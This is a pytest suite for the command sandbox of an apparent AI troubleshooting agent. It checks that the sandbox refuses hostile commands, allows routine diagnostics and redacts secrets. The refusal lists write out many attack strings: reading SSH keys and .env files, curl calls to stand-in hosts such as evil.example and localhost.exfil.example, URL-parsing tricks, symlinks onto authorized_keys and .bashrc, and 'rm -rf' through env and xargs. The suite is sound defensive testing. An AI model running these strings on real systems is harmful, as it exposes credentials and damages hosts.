"""Hardening of deneb.tools.run: the read-only tier is deny-by-default for ARGUMENTS, not only
binaries. subprocess.run is stubbed in every test, so nothing here executes a command: a
REFUSED case must leave the stub uncalled, an ALLOWED case must reach it exactly once with
the exact argv. The refuse strings are data."""
import os
import shlex
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from deneb import tools  # noqa: E402


class _P:
    stdout, stderr, returncode = "stub-output", "", 0


@pytest.fixture
def ran(monkeypatch, tmp_path):
    calls = []

    def fake(argv, **kw):
        calls.append(list(argv))
        return _P()

    monkeypatch.setattr(tools.subprocess, "run", fake)
    monkeypatch.setenv("HOME", str(tmp_path))
    return calls


def _refused(ran, cmd, fn=None):
    r = (fn or tools.run)(cmd)
    assert r.get("refused"), (cmd, r)
    assert r["output"].startswith("[refused]"), r
    assert ran == [], f"subprocess.run was called for {cmd!r}: {ran}"


def _allowed(ran, cmd):
    r = tools.run(cmd)
    assert not r.get("refused"), (cmd, r)
    assert ran == [shlex.split(cmd)], (cmd, ran)
    return r


# ── The problem: every row must be refused, nothing executed ───────────────────────────
PROBLEM_ROWS = [
    "python3 -V -c print(1)",
    "python3 -c print(1) -V",
    "gcc --version -x c /dev/null -o /tmp/f",
    "cmake --version -P /tmp/f.cmake",
    "env echo HI",
    "env",
    "printenv",
    "env | printenv",
    "cat ~/.ssh/id_rsa",
    "head -n 50 ~/.env",
    "grep -r KEY ~",
    "curl file://localhost/home/u/.ssh/id_rsa",
    "curl https://evil.example/?q=localhost",
    "curl -D ~/.bashrc http://localhost:8001/health",
    "curl -K cfg http://localhost:8001/",
    "sort -o ~/.bashrc /dev/null",
    "uniq /dev/null ~/.bashrc",
    "tree -o ~/.bashrc /",
    "sysctl vm.swappiness=10",
    "hostnamectl set-hostname x",
    "pip cache purge",
    "journalctl --vacuum-time=1s",
    "rocm-smi --setfan 255",
    "date -s 2020-01-01",
    "ss -K dst 1.2.3.4",
    "systemctl --user show-environment",
]


@pytest.mark.parametrize("cmd", PROBLEM_ROWS)
def test_problem_row_is_refused_and_not_executed(ran, cmd):
    _refused(ran, cmd)


# ── Item 9: legitimate troubleshooting stays allowed, argv unchanged ──────────────────
LEGIT = [
    "journalctl --user -u llama-server -n 50 --no-pager",
    "journalctl -u ollama -b -p err -o cat",
    "systemctl --user status llama-server",
    "systemctl is-active ollama",
    "systemctl --user cat llama-server",
    "ls -la ~/.ssh",
    "cat /etc/os-release",
    "head -n 20 ~/models/x.log",
    "tail -n 100 /var/log/syslog",
    "grep -n error /tmp/x.log",
    "grep -i vulkan ~/llama.cpp/build/CMakeCache.txt",
    "df -h", "free -g", "ss -ltnp", "ps aux", "nvidia-smi", "rocm-smi", "rocminfo", "lspci",
    "uname -a", "ollama ps", "ollama list",
    "curl -s http://localhost:8001/v1/models",
    "curl -sS -m 3 http://127.0.0.1:11434/api/tags",
    "curl -s http://[::1]:8080/health",
    "curl -s localhost:8001/v1/models --max-time 3",
    "du -sh ~/models",
    "stat ~/models/x.gguf",
    'find ~/models -name "*.gguf"',
    "printenv HSA_OVERRIDE_GFX_VERSION",
    "python3 --version", "gcc --version", "cmake --version",
    "pip list", "pip show torch",
    "sysctl vm.swappiness",
    "date", "date -u",
]


@pytest.mark.parametrize("cmd", LEGIT)
def test_legit_command_is_allowed_once_with_exact_argv(ran, cmd):
    _allowed(ran, cmd)


def test_systemctl_cat_output_is_redacted(monkeypatch, ran):
    class P2(_P):
        stdout = ('[Service]\nEnvironment="API_KEY=fake-not-a-real-secret-123"\n'
                  'Environment=HSA_OVERRIDE_GFX_VERSION=11.5.1\n')
    monkeypatch.setattr(tools.subprocess, "run", lambda argv, **k: P2())
    out = tools.run("systemctl --user cat llama-server")["output"]
    assert "fake-not-a-real-secret-123" not in out
    assert "HSA_OVERRIDE_GFX_VERSION=11.5.1" in out


# ── Rule 1: version-only binaries ─────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "python3", "python3 -V --version", "python3 --version x", "python -c 1", "gcc",
    "gcc --version --version", "g++ -dumpversion -v", "nvcc --version -o x", "cmake",
    "python3 -m http.server", "gcc -dumpmachine",
])
def test_version_only_binaries_take_exactly_one_version_flag(ran, cmd):
    _refused(ran, cmd)


@pytest.mark.parametrize("cmd", ["python -V", "g++ --version", "gcc -dumpversion", "nvcc --version"])
def test_version_only_single_flag_allowed(ran, cmd):
    _allowed(ran, cmd)


# ── Rule 2: env / printenv / systemctl show-environment ───────────────────────────
@pytest.mark.parametrize("cmd", [
    "env", "env FOO=1 ls", "/usr/bin/env echo hi", "printenv", "printenv -0",
    "printenv API_KEY", "printenv HF_TOKEN", "printenv MY_SECRET", "printenv DB_PASSWORD",
    "printenv X_PASS", "printenv AWS_CREDENTIALS", "printenv OAUTH_X", "printenv SSH_AUTH_SOCK",
    "printenv PRIVATE_X", "printenv COOKIE_JAR", "printenv XDG_SESSION_ID", "printenv SENTRY_DSN",
    "printenv path api_key", "printenv HOME token",
])
def test_env_and_secret_printenv_refused(ran, cmd):
    _refused(ran, cmd)


def test_printenv_with_plain_names_allowed(ran):
    _allowed(ran, "printenv HOME PATH CUDA_VISIBLE_DEVICES")


def test_systemctl_show_environment_refused_system_scope_too(ran):
    _refused(ran, "systemctl show-environment")
    _refused(ran, "systemctl -p status show-environment")


# ── Rule 3: content readers must not read secrets ────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "cat ~/.ssh/config", "cat ~/.ssh/known_hosts", "cat ~/.gnupg/pubring.kbx",
    "cat ~/.aws/config", "cat ~/.azure/accessTokens.json", "cat ~/.kube/config",
    "cat ~/.docker/config.json", "cat ~/.config/gcloud/properties",
    "cat ~/.password-store/x.gpg", "cat ~/.local/share/keyrings/login.keyring",
    "cat /home/other/.ssh/anything", "cat ~/proj/.ssh/anything", "cat ~/proj/.env",
    "cat ~/.env.production", "cat /tmp/my-token.txt", "cat ~/x/server.pem", "cat ~/x/id_rsa.pub",
    "cat ~/.netrc", "cat ~/.git-credentials", "cat ~/.npmrc", "cat ~/x/secrets.yaml",
    "head ~/.env", "tail -n 5 ~/.env", "tail -f ~/.env", "cut -d= -f2 ~/.env",
    "sort ~/.env", "uniq ~/.env", "file ~/.env", "sha256sum ~/.ssh/id_rsa", "md5sum ~/.env",
    "wc ~/.env", "stat ~/.ssh/id_rsa", "grep KEY ~/.env", "egrep KEY ~/.env",
    "zgrep KEY ~/.env", "grep -n pass ~/.ssh/config", "cat .ssh/config", "cat .env",
    "grep -f ~/.env /etc/hostname", "grep -e x ~/.env", "cat /tmp/ok.log ~/.env",
    "cat --show-all ~/.env", "grep --file=~/.ssh/config x /etc/hostname",
    "wc --files0-from=~/.env",
])
def test_content_readers_refuse_secret_paths(ran, cmd):
    _refused(ran, cmd)


def test_symlink_into_secret_dir_is_refused(ran, tmp_path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / ".ssh" / "innocent.txt").write_text("x")
    (tmp_path / "link.txt").symlink_to(tmp_path / ".ssh" / "innocent.txt")
    _refused(ran, "cat ~/link.txt")
    (tmp_path / "keyfile").write_text("x")
    (tmp_path / "plain.txt").symlink_to(tmp_path / "keyfile")
    _allowed(ran, "cat ~/plain.txt")


def test_dotdot_into_secret_dir_is_refused(ran, tmp_path):
    (tmp_path / "a").mkdir()
    _refused(ran, "cat ~/a/../.ssh/config")


def test_name_only_tools_may_still_list_secret_names(ran):
    for c in ("ls -la ~/.ssh", "find ~/.ssh -name 'id_*'", "du -sh ~/.ssh", "tree ~/.ssh"):
        ran.clear()
        _allowed(ran, c)


def test_grep_pattern_is_not_mistaken_for_a_path(ran):
    _allowed(ran, "grep token /tmp/x.log")
    ran.clear()
    _allowed(ran, "grep -e token -e secret /tmp/x.log")


@pytest.mark.parametrize("cmd", [
    "grep -r x /tmp", "grep -R x /tmp", "grep --recursive x /tmp", "grep -d recurse x /tmp",
    "grep --directories=recurse x /tmp", "grep -rn x /tmp", "grep -Rin x /tmp", "grep -nr x /tmp",
    "grep -ir x /tmp", "grep --dereference-recursive x /tmp", "grep --recurs x /tmp",
    "grep --dir=recurse x /tmp", "grep --directories recurse x /tmp", "egrep -r x /tmp",
    "zgrep -r x /tmp", "grep -d rec x /tmp",
])
def test_recursive_grep_refused(ran, cmd):
    _refused(ran, cmd)


def test_grep_non_recursive_flags_with_r_inside_values_allowed(ran):
    _allowed(ran, "grep -n -i -A 2 error /tmp/x.log")
    ran.clear()
    _allowed(ran, "grep -d skip x /tmp/x.log")


# ── Rule 4: writers hidden in readers ────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "sort -o /tmp/out /tmp/in", "sort --output=/tmp/out /tmp/in", "sort -ofile /tmp/in",
    "sort -no /tmp/out /tmp/in", "sort --outp=/tmp/out /tmp/in", "sort --output /tmp/o /tmp/in",
    "sort --compress-program=sh /tmp/in", "uniq /tmp/a /tmp/b", "uniq -c /tmp/a /tmp/b",
    "uniq -f 1 /tmp/a /tmp/b", "tree -o /tmp/out /tmp", "tree -do /tmp/out /tmp",
    "tree --fromfile /tmp/x", "file -C", "file --compile", "file -C -m /tmp/magic",
    "nvidia-smi -f /tmp/out", "nvidia-smi --filename=/tmp/out", "journalctl --cursor-file=/tmp/c",
    "ss -D /tmp/out", "ss --diag=/tmp/out", "pip list --log /tmp/l", "du --files0-from=/tmp/x",
])
def test_writers_hidden_in_readers_refused(ran, cmd):
    _refused(ran, cmd)


def test_uniq_with_one_operand_and_value_flags_allowed(ran):
    _allowed(ran, "uniq -c /tmp/a")
    ran.clear()
    _allowed(ran, "uniq -f 1 /tmp/a")
    ran.clear()
    _allowed(ran, "sort -u -k 2 /tmp/a")


# ── Rule 5: curl ─────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "curl file:///etc/passwd", "curl gopher://localhost/x", "curl dict://localhost/x",
    "curl ftp://localhost/x", "curl http://example.com/", "curl http://localhost.evil.example/",
    "curl http://evil.example/localhost", "curl http://localhost@evil.example/",
    "curl http://evil.example@localhost/", "curl http://localhost:80@evil.example/",
    "curl http://127.0.0.1.evil.example/", "curl http://localhost./", "curl http://0.0.0.0:8001/",
    "curl http://[::2]/", "curl http://{localhost,evil.example}/", "curl http://[::1]x@evil/",
    "curl -L http://localhost/", "curl -o /tmp/x http://localhost/", "curl -O http://localhost/x",
    "curl -T /tmp/x http://localhost/", "curl -d a=b http://localhost/", "curl -F a=@/tmp/x http://localhost/",
    "curl -X POST http://localhost/", "curl -c /tmp/j http://localhost/", "curl -b /tmp/j http://localhost/",
    "curl --trace /tmp/t http://localhost/", "curl --stderr /tmp/e http://localhost/",
    "curl --libcurl /tmp/l.c http://localhost/", "curl --create-dirs -o /tmp/a/b http://localhost/",
    "curl -u user:pw http://localhost/", "curl --config /tmp/c http://localhost/",
    "curl -K /tmp/c", "curl -D /tmp/h http://localhost/", "curl --dump-header /tmp/h http://localhost/",
    "curl -s", "curl", "curl -s --max-time", "curl -m abc http://localhost/",
    "curl -w @/tmp/fmt http://localhost/", "curl -w %output{/tmp/x} http://localhost/",
    "curl -w '%{http_code}' http://localhost/", "curl --write-out '%{http_code}' http://localhost/",
    "curl --json @/tmp/x http://localhost/", "curl --data-urlencode @/tmp/x http://localhost/",
    "curl -c /tmp/jar http://localhost/", "curl --cookie-jar /tmp/jar http://localhost/",
    "curl --trace-ascii /tmp/t http://localhost/", "curl http://localhost.exfil.example",
    "curl http://127.0.0.1.nip.io/", "curl -H X-Note:localhost http://evil.example/",
    "curl -H @/tmp/h http://localhost/", "curl --header @/tmp/h http://localhost/",
    "curl -H @/tmp/h http://localhost/", "curl --proxy http://evil.example http://localhost/",
    "curl -x http://evil.example http://localhost/", "curl --next http://localhost/",
    "curl -s http://localhost/ http://evil.example/", "curl --output-dir /tmp http://localhost/",
    "curl --max-time=3 http://localhost/", "curl -q http://localhost/", "curl -g http://localhost/",
    "curl -sL http://localhost/", "curl --data-binary @/tmp/x http://localhost/",
    "curl -s 'http://localhost\\@evil.example/'", "curl --unix-socket /tmp/s http://localhost/",
    "curl --resolve localhost:80:1.2.3.4 http://localhost/", "curl -J http://localhost/",
])
def test_curl_refused(ran, cmd):
    _refused(ran, cmd)


@pytest.mark.parametrize("cmd", [
    "curl -s http://localhost:8001/v1/models", "curl -sS http://LOCALHOST:1/", "curl -fsS https://127.0.0.1/x?q=1",
    "curl -sf http://[::1]/", "curl -i http://localhost/", "curl -I http://localhost/",
    "curl --head http://localhost/", "curl -v http://localhost/", "curl -fs http://localhost/",
    "curl --max-time 3 http://localhost/", "curl --connect-timeout 2 http://localhost/",
    "curl -H 'Accept: application/json' http://localhost/", "curl --header 'X: y' http://localhost/",
    "curl --compressed http://localhost/", "curl localhost:8001/health", "curl 127.0.0.1:8080",
    "curl -s http://localhost:8001/a http://127.0.0.1:8001/b",
])
def test_curl_allowed(ran, cmd):
    _allowed(ran, cmd)


# ── Rule 6: verbs and flags of read-ish tools ───────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "hostnamectl set-hostname x", "hostnamectl set-chassis server", "hostnamectl status -H host",
    "hostnamectl --host=x", "hostnamectl -H user@host",
    "loginctl lock-session 1", "loginctl terminate-user x", "loginctl kill-user x",
    "loginctl attach seat0 x", "loginctl flush-devices", "loginctl -H host list-sessions",
    "loginctl --machine=x list-sessions", "loginctl -p Name stop x",
    "pip install x", "pip cache purge", "pip cache list", "pip config list", "pip download x",
    "pip uninstall x", "pip3 install x", "pip", "pip -v list", "pip debug", "pip inspect",
    "pip list --log /tmp/l", "pip --python /tmp/py list", "pip list --python=/tmp/py",
    "journalctl --vacuum-size=1M", "journalctl --vacuum-files=1", "journalctl --rotate",
    "journalctl --flush", "journalctl --sync", "journalctl --relinquish-var",
    "journalctl --smart-relinquish-var", "journalctl --setup-keys", "journalctl --update-catalog",
    "journalctl --vacuum-t=1s", "journalctl --rot", "journalctl --update-c",
    "sysctl -w vm.swappiness=10", "sysctl --write vm.swappiness=10", "sysctl -p", "sysctl --load",
    "sysctl --system", "sysctl vm.swappiness=10", "sysctl -a vm.x=1", "sysctl -nw vm.x", "sysctl --syst",
    "date -s now", "date --set=2020-01-01", "date 010100002020", "date 0101", "date -d 2020-01-01",
    "date -f /tmp/x", "date --file=/tmp/x", "date -r /tmp/x", "date -u 010100002020",
    "ss -K", "ss --kill", "ss -ltnK", "ss -D /tmp/x", "ss -F /tmp/x", "ss --ki",
    "rocm-smi --setfan 255", "rocm-smi --setsclk 1", "rocm-smi --resetclocks", "rocm-smi --reset",
    "rocm-smi -r", "rocm-smi --setperflevel high", "rocm-smi --save /tmp/x", "rocm-smi --load /tmp/x",
    "ip -b /tmp/x", "ip -batch /tmp/x", "ip -force link", "ip -forc link", "ip netns exec x id",
    "ip netns e x id", "ip -n x netns exec y id", "ip vrf exec x id", "ip addr add 1.2.3.4 dev x",
    "systemctl -H host status x", "systemctl --host=host status x", "systemctl -M m status x",
    "systemctl --machine=m status x", "systemctl -Mm status x", "systemctl -Hhost status x",
    "systemctl -H x status y", "systemctl -Hx status y", "systemctl --host x status y",
    "systemctl --host=user@remote status y", "systemctl -M x status y", "systemctl --machine=x status y",
    "loginctl terminate-user x", "loginctl kill-user x", "loginctl terminate-session 1",
    "loginctl kill-session 1",
    "systemctl start x", "systemctl --user restart x", "systemctl -p status stop x",
    "systemctl status stop x", "systemctl edit x", "systemctl set-property x A=1",
    "systemctl mask x", "systemctl kill x", "systemctl poweroff", "systemctl daemon-reload",
    "systemd-analyze set-log-level debug", "systemd-analyze set-log-target console",
    "systemd-analyze set-anything", "systemd-analyze log-level debug", "systemd-analyze dump",
    "systemd-analyze -H host blame", "systemd-analyze --host=h blame",
])
def test_verbs_and_flags_refused(ran, cmd):
    _refused(ran, cmd)


@pytest.mark.parametrize("cmd", [
    "hostnamectl", "hostnamectl status",
    "loginctl", "loginctl list-sessions", "loginctl list-users", "loginctl list-seats",
    "loginctl show-session 1", "loginctl show-user zz", "loginctl session-status 1",
    "loginctl user-status zz", "loginctl seat-status seat0", "loginctl -p Name show-user zz",
    "pip freeze", "pip check", "pip --version", "pip -V", "pip3 list", "pip3 show -f torch",
    "pip list --format=json",
    "journalctl -o json -n 5", "journalctl --output=short-iso -n 5", "journalctl -b -1 --no-pager",
    "journalctl --since today -u x",
    "sysctl -n vm.swappiness", "sysctl -a", "sysctl hw.memsize",
    "date -R", "date -I", "date -Iseconds", "date +%s", "date -u +%Y-%m-%d", "date --utc",
    "ss -ltn", "ss -s", "ss -tulpn",
    "rocm-smi --showproductname --showmeminfo vram --json", "rocm-smi --showdriverversion",
    "rocm-smi -d 0 --showtemp",
    "ip addr", "ip -s link", "ip -f inet addr show", "ip route", "ip netns list", "ip a",
    "systemctl status x --no-pager", "systemctl --user list-timers", "systemctl is-enabled x",
    "systemctl --user show x -p NRestarts --value", "systemctl show -p ActiveState x",
    "systemctl -t service list-units --state=failed", "systemctl list-unit-files --type service",
    "systemctl --user list-dependencies x", "systemctl cat x", "systemctl get-default",
    "systemd-analyze", "systemd-analyze blame", "systemd-analyze log-level",
    "systemd-analyze critical-chain", "systemd-analyze security x",
])
def test_verbs_and_flags_allowed(ran, cmd):
    _allowed(ran, cmd)


def test_systemctl_mutating_verb_keeps_propose_as_fix_hint(ran):
    r = tools.run("systemctl restart llama-server")
    assert r["refused"] and "propose it as a fix" in r["output"]
    assert ran == []


# ── Item 10: one short line, says the user can run it themselves ─────────────────
@pytest.mark.parametrize("cmd", ["env", "cat ~/.ssh/id_rsa", "curl http://example.com/",
                                 "sort -o /tmp/x /tmp/y", "date -s now", "grep -r x /tmp",
                                 "python3 -c 1", "pip install x"])
def test_refusal_is_one_short_line_and_points_to_user(ran, cmd):
    out = tools.run(cmd)["output"]
    assert "\n" not in out and len(out) < 260, out
    assert "yourself" in out.lower(), out


# ── Item 7: redaction ────────────────────────────────────────────────────────────
FAKE = "fake-not-a-real-secret-123"
# Marker text is assembled at runtime so no test-file line looks like a real key block.
_PK = "PRIVATE" + " KEY"


def _blk(kind, body="ZmFrZS1ub3QtYS1yZWFs", end=True):
    s = f"-----BEGIN {kind}-----\n{body}\n"
    return s + (f"-----END {kind}-----" if end else "")


@pytest.mark.parametrize("line", [
    f"API_KEY={FAKE}", f"HF_TOKEN={FAKE}", f"MY_SECRET={FAKE}", f"DB_PASS={FAKE}",
    f"AWS_CREDENTIALS={FAKE}", f"SSH_AUTH_SOCK={FAKE}", f"PRIVATE_THING={FAKE}",
    f"COOKIE_JAR={FAKE}", f"XDG_SESSION_ID={FAKE}", f"SENTRY_DSN=https://abc@o1.ingest.example/{FAKE}",
    f"Environment=API_KEY={FAKE}", f'Environment="API_KEY={FAKE}"',
    f'Environment="HSA_OVERRIDE_GFX_VERSION=11.5.1" "API_KEY={FAKE}" "X=1"',
    f"Environment='MY_TOKEN={FAKE}'", f"export OPENAI_API_KEY={FAKE}", f"api_key=short",
])
def test_name_based_env_values_redacted(line):
    out = tools._redact(line)
    assert FAKE not in out and "short" not in out.replace("[REDACTED]", ""), out
    assert "[REDACTED]" in out


def test_innocent_env_lines_stay_readable():
    s = ("HSA_OVERRIDE_GFX_VERSION=11.5.1\nCUDA_VISIBLE_DEVICES=0\n"
         'Environment="HSA_OVERRIDE_GFX_VERSION=11.5.1" "CUDA_VISIBLE_DEVICES=0"\nLANG=en_US.UTF-8\n')
    assert tools._redact(s) == s


def test_quoted_environment_keeps_other_assignments():
    out = tools._redact(f'Environment="HSA_OVERRIDE_GFX_VERSION=11.5.1" "API_KEY={FAKE}" "CUDA_VISIBLE_DEVICES=0"')
    assert "HSA_OVERRIDE_GFX_VERSION=11.5.1" in out and "CUDA_VISIBLE_DEVICES=0" in out
    assert out.count("[REDACTED]") == 1


def test_url_userinfo_redacted():
    out = tools._redact(f"remote = https://alice:{FAKE}@git.example/repo.git and ssh://bob:{FAKE}@h:22/x")
    assert FAKE not in out
    assert "https://alice:[REDACTED]@git.example/repo.git" in out
    assert "ssh://bob:[REDACTED]@h:22/x" in out
    assert tools._redact("see https://example.com/a:b@c") == "see https://example.com/a:b@c"


def test_pem_block_redacted():
    out = tools._redact("before\n" + _blk("OPENSSH " + _PK, "b3BlbnNzaC1rZXktdjE") + "\nafter")
    assert out == "before\n[REDACTED-PRIVATE-KEY]\nafter", out
    for kind in ("RSA " + _PK, _PK, "EC " + _PK):
        assert tools._redact(_blk(kind)) == "[REDACTED-PRIVATE-KEY]"


def test_truncated_pem_without_end_is_still_redacted():
    out = tools._redact("x\n" + _blk("RSA " + _PK, "ZmFrZS1ub3QtYS1yZWFs\nbW9yZS1mYWtl", end=False))
    assert "ZmFrZS1" not in out and "[REDACTED-PRIVATE-KEY]" in out


def test_public_certificate_is_not_a_private_key():
    assert "[REDACTED-PRIVATE-KEY]" not in tools._redact(_blk("CERTIFICATE", "abc"))


def test_redaction_applies_to_run_observations(monkeypatch, ran):
    class P2(_P):
        stdout = f"A_SECRET={FAKE}\nhttps://u:{FAKE}@h/x\n"
    monkeypatch.setattr(tools.subprocess, "run", lambda argv, **k: P2())
    out = tools.run("cat /tmp/x.log")["output"]
    assert FAKE not in out


# ── Item 8: the apply tier (fix / write_file) ───────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "systemctl --user -H host restart x", "systemctl --user --host=h restart x",
    "systemctl --user -M m restart x", "systemctl --user --machine=m restart x",
    "systemctl --user -Mm restart x",
    "systemctl --user enable /tmp/evil.service", "systemctl --user enable ../evil.service",
    "systemctl --user enable /etc/evil.service",
    "ln -s /tmp/evil ~/.ssh/authorized_keys", "ln -s /tmp/evil ~/.ssh/",
    "ln -s /tmp/evil ~/.bashrc", "ln -s /tmp/evil ~/.profile", "ln -s /tmp/evil ~/.zshrc",
    "ln -s -t ~/.ssh /tmp/evil", "ln -s --target-directory=~/.ssh /tmp/evil",
    "ln -s /tmp/evil ~/.gnupg/gpg.conf", "ln -s /tmp/evil ~/.aws/config",
    "ln -s --force a b", "ln -s --for a b", "ln -sf a b",
    "mkdir -m 777 /tmp/x", "mkdir -m 4755 /tmp/x", "mkdir --mode=1777 /tmp/x",
    "mkdir -m u+s /tmp/x", "mkdir -pm 777 /tmp/x", "mkdir -m 1755 /tmp/x",
])
def test_apply_tier_refuses_clearly_unsafe(ran, cmd):
    _refused(ran, cmd, fn=tools.run_write)


@pytest.mark.parametrize("cmd", [
    "systemctl --user restart llama-server", "systemctl --user daemon-reload",
    "systemctl --user enable llama-server.service", "systemctl --user enable --now llama-server",
    "ln -s /opt/x/bin/tool ~/.local/bin/tool", "mkdir -p ~/.config/systemd/user",
    "mkdir -m 700 ~/models", "mkdir -m700 ~/models", "mkdir ~/models",
])
def test_apply_tier_still_allows_normal_fixes(ran, cmd):
    r = tools.run_write(cmd)
    assert not r.get("refused"), (cmd, r)
    assert ran == [shlex.split(cmd)]


def test_apply_enable_of_unit_path_under_user_unit_dir_allowed(ran, tmp_path):
    d = tmp_path / ".config" / "systemd" / "user"
    d.mkdir(parents=True)
    r = tools.run_write(f"systemctl --user enable {d}/x.service")
    assert not r.get("refused"), r


@pytest.mark.parametrize("rel", [".ssh/authorized_keys", ".ssh/config", ".gnupg/gpg.conf",
                                 ".aws/config", ".kube/config", ".docker/config.json",
                                 ".config/gcloud/x.json", ".password-store/a.gpg",
                                 ".local/share/keyrings/login.keyring", "proj/.ssh/x"])
def test_write_file_refuses_secret_dirs(tmp_path, monkeypatch, rel):
    monkeypatch.setenv("HOME", str(tmp_path))
    target = tmp_path / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    r = tools.write_file(f"~/{rel}", "fake-not-a-real-secret-123\n")
    assert r.get("refused"), r
    assert not target.exists()


def test_write_file_refuses_symlink_into_secret_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / ".ssh").mkdir()
    (tmp_path / "l.txt").symlink_to(tmp_path / ".ssh" / "authorized_keys")
    assert tools.write_file("~/l.txt", "x").get("refused")
    assert not (tmp_path / ".ssh" / "authorized_keys").exists()


def test_write_file_normal_path_still_works(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    r = tools.write_file("~/notes.txt", "hello\n")
    assert r["ok"] and (tmp_path / "notes.txt").read_text() == "hello\n"


# ── Scope additions: secret-file names, control characters, rc files ───────────────────
@pytest.mark.parametrize("name", ["id_ed25519", "id_ecdsa", "id_dsa", "id_ecdsa_sk", "id_custom",
                                  ".pgpass", "credentials.json", "x.p12", "x.pfx", ".netrc",
                                  ".git-credentials"])
def test_more_secret_file_names_blocked_in_run_and_read_file(ran, tmp_path, name):
    f = tmp_path / name
    f.write_text("fake-not-a-real-secret-123\n")
    _refused(ran, f"cat {f}")
    out = tools.read_file(str(f))["output"]
    assert "fake-not-a-real-secret-123" not in out


def test_public_key_names_are_not_treated_as_private_keys():
    assert not tools._SECRET_FILE.match("id_ed25519.pub")
    assert not tools._SECRET_FILE.match("id_ecdsa.pub")


@pytest.mark.parametrize("cmd", [
    "ls ~/models\r\x1b[2K", "ls -la\x1b[31m", "cat /etc/hostname\x00", "ls \x7f",
    "ls ~/a\nls ~/b", "ls \x08",
])
def test_control_characters_refused_in_run(ran, cmd):
    _refused(ran, cmd)


@pytest.mark.parametrize("cmd", [
    "mkdir -p ~/models\r\x1b[2K", "systemctl --user restart x\x1b[2K", "mkdir ~/a\x00b",
    "mkdir ~/a\nmkdir ~/b", "mkdir ~/a\x7f",
])
def test_control_characters_refused_in_fix(ran, cmd):
    _refused(ran, cmd, fn=tools.run_write)


def test_control_characters_refused_in_write_file_path(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    for bad in ("~/a\x1b[2Kb.txt", "~/a\rb.txt", "~/a\x00b.txt", "~/a\nb.txt", "~/a\x7fb.txt"):
        assert tools.write_file(bad, "x").get("refused"), bad
    assert list(tmp_path.iterdir()) == []


def test_tab_inside_a_quoted_argument_is_still_fine(ran):
    r = tools.run("grep 'a\tb' /tmp/x.log")
    assert not r.get("refused"), r


@pytest.mark.parametrize("rel", [".bashrc", ".profile", ".bash_profile", ".zshrc", ".zshenv",
                                 ".zprofile", ".bash_login", ".bash_logout", ".xprofile"])
def test_write_file_refuses_shell_rc_and_profile(tmp_path, monkeypatch, rel):
    monkeypatch.setenv("HOME", str(tmp_path))
    r = tools.write_file(f"~/{rel}", "echo hi\n")
    assert r.get("refused"), r
    assert not (tmp_path / rel).exists()


def test_write_file_rc_via_symlink_refused(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / "l").symlink_to(tmp_path / ".bashrc")
    assert tools.write_file("~/l", "x").get("refused")


# ── Review Part 3, group A: scenarios named in the findings, one row each ───────────────
REVIEW_ROWS = [
    "env sh -c 'echo hi'", "env rm -rf /tmp/x", "env python3 -c 1",
    "sort -o ~/.bashrc /dev/null", "uniq /dev/null ~/.bashrc", "tree -o F /",
    "curl -D F http://localhost:8001/", "curl -c F http://localhost:8001/",
    "curl --trace-ascii F http://localhost:8001/",
    "curl http://localhost.exfil.example/x", "curl http://127.0.0.1.nip.io/x",
    "curl -H X-Note:localhost https://evil.example/",
    "curl --data-urlencode @/tmp/f http://localhost:8001/", "curl --json @/tmp/f http://localhost:8001/",
    "curl -H @/tmp/f http://localhost:8001/", "curl file://localhost/etc/passwd",
    "printenv AWS_SECRET_ACCESS_KEY", "printenv MODEL_KEY",
    "loginctl terminate-user me", "loginctl kill-user me",
    "systemctl --host=user@remote.example status x", "systemctl -H user@remote.example status x",
    "cat ~/.ssh/id_ed25519", "cat ~/.ssh/id_ecdsa",
]


@pytest.mark.parametrize("cmd", REVIEW_ROWS)
def test_review_part3_rows_refused_without_running(ran, cmd):
    _refused(ran, cmd)


@pytest.mark.parametrize("name", ["id_ed25519", "id_ecdsa", "id_rsa"])
def test_read_file_refuses_private_key_names(tmp_path, monkeypatch, name):
    monkeypatch.setenv("HOME", str(tmp_path))
    d = tmp_path / ".ssh"
    d.mkdir()
    (d / name).write_text("fake-not-a-real-secret-123")
    r = tools.read_file(str(d / name))
    assert FAKE not in str(r), r


@pytest.mark.parametrize("line", [
    f"AWS_SECRET_ACCESS_KEY={FAKE}", f"MODEL_KEY={FAKE}", f"DATABASE_URL=postgres://u:{FAKE}@db/x",
])
def test_review_env_values_redacted(line):
    assert FAKE not in tools._redact(line)


def test_printenv_database_url_output_is_redacted(monkeypatch, ran):
    class P2(_P):
        stdout = f"postgres://u:{FAKE}@db/x\n"
    monkeypatch.setattr(tools.subprocess, "run", lambda argv, **k: P2())
    assert FAKE not in tools.run("printenv DATABASE_URL")["output"]


# ── xargs runs any command it is handed, so it is not on the allow-list ────────────────
@pytest.mark.parametrize("cmd", [
    "xargs rm",
    "ls | xargs rm",
    "echo hi | xargs -I{} sh -c {}",
    "find . -name x | xargs cat",
])
def test_xargs_is_refused_and_not_executed(ran, cmd):
    _refused(ran, cmd)
